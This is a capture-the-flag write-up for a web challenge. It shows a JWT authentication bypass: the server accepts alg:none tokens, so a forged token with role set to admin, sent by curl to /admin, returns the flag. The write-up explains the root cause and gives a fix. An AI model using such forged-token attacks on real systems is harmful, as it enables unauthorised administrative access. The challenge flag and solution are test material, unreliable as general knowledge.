# JWT Forgery

- **Category:** web
- **Points:** 150
- **Target:** http://54.72.82.22:8100
- **Status:** ✅ SOLVED
- **Flag:** `safctf{1e4d7bdea93b47c2a813ea5a89f20870}`

## Observations

`GET /` sets a session cookie that is a JWT:

```
set-cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJ1c2VyIn0.
```

Decoded:

```json
{"alg":"none","typ":"JWT"}          // header
{"username":"bob","role":"user"}    // payload
                                     // signature: empty
```

The server already ships `alg:none` tokens with no signature. `/admin` returns
`{"error":"not admin"}`, and `GET /` echoes back the `role` it read from the
token — so authorization is driven purely by an unverified payload field.

## Exploit

Re-encode the payload with `"role":"admin"`, keep `alg:none`, leave the
signature segment empty:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJhZG1pbiJ9.
```

```
curl -H 'Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJhZG1pbiJ9.' \
     http://54.72.82.22:8100/admin
```

Response:

```json
{"message":"Welcome, admin!","flag":"safctf{1e4d7bdea93b47c2a813ea5a89f20870}"}
```

## Notes

The `alg` check is case-insensitive-blind — `none`, `None`, `NONE`, `nOnE` all
pass, and a literal `none` signature string works too. Any of them returns the
flag, so the app never verifies a signature at all.

## Root cause / fix

The verifier accepts `alg:none` (RFC 7519 marks it optional and unsafe) and
never checks the signature. Fix: pin the expected algorithm server-side
(`algorithms=["HS256"]`) and reject `none` outright; never read `role` from a
token you did not verify.

## Reproduction

```sh
.venv/bin/python chal/web/jwt-forgery/solve.py
```
